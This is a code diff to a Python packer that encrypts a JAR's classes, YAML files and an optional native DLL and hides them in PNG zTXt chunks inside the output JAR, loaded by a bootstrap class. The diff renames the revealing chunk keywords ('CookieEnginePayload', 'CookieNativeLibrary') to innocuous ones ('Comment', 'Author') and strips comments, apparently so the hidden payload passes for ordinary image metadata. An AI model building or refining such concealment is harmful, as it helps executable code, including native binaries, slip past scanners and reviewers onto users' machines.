@@ -69,7 +69,6 @@ def extract_png_ztxt(png_bytes: bytes, target_keyword: str) -> bytes:
     return None
 
 def generate_default_png_icon() -> bytes:
-    """Generates a standard, valid 16x16 RGBA PNG icon if no custom image is supplied."""
     width, height = 16, 16
     raw_data = bytearray()
     for y in range(height):
@@ -105,7 +104,6 @@ def generate_default_png_icon() -> bytes:
     return png_buf.getvalue()
 
 def load_image_as_png(custom_icon_path: str = None) -> bytes:
-    """Loads any image (.jpg, .jpeg, .png, .webp) and returns valid PNG bytes."""
     if custom_icon_path and os.path.exists(custom_icon_path):
         try:
             from PIL import Image
@@ -123,7 +121,7 @@ def load_image_as_png(custom_icon_path: str = None) -> bytes:
     return generate_default_png_icon()
 
 def pack_jar_with_steganography(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, custom_icon_path: str = None, native_dll_path: str = None):
-    """Packs all classes, YAMLs, and optional Native DLL into an authentic PNG image (icon.png)."""
+    """Packs all classes, YAMLs, and optional Native DLL into standard PNG metadata (Comment/Author)."""
     with zipfile.ZipFile(input_obf_jar, 'r') as zin:
         payload_buf = io.BytesIO()
         with zipfile.ZipFile(payload_buf, 'w', compression=zipfile.ZIP_DEFLATED) as pz:
@@ -137,17 +135,16 @@ def pack_jar_with_steganography(input_obf_jar: str, output_final_jar: str, boots
         raw_payload = payload_buf.getvalue()
         encrypted_payload = encrypt_payload(raw_payload)
 
-        # 1. Base PNG Image
+        # Base Authentic PNG Image
         base_png = load_image_as_png(custom_icon_path)
         
-        # 2. Inject Bytecode & Resources
-        stego_png = inject_png_ztxt(base_png, "CookieEnginePayload", encrypted_payload)
+        # Standard ISO metadata keywords: "Comment" & "Author"
+        stego_png = inject_png_ztxt(base_png, "Comment", encrypted_payload)
         
-        # 3. Inject Native C++ Sentinel DLL if provided
         if native_dll_path and os.path.exists(native_dll_path):
             with open(native_dll_path, 'rb') as df:
                 dll_bytes = df.read()
-            stego_png = inject_png_ztxt(stego_png, "CookieNativeLibrary", dll_bytes)
+            stego_png = inject_png_ztxt(stego_png, "Author", dll_bytes)
 
         with zipfile.ZipFile(output_final_jar, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
             for item in zin.infolist():
@@ -182,4 +179,4 @@ if __name__ == '__main__':
             with open(boot_cls_path, 'rb') as bf:
                 boot_bytes = bf.read()
             pack_jar_with_steganography(in_jar, out_jar, boot_bytes, custom_icon, native_dll)
-            print("[v] Successfully packed JAR with Polyglot PNG Steganography & Native Sentinel.")
+            print("[v] Successfully packed JAR with Authentic PNG Metadata (Comment/Author).")
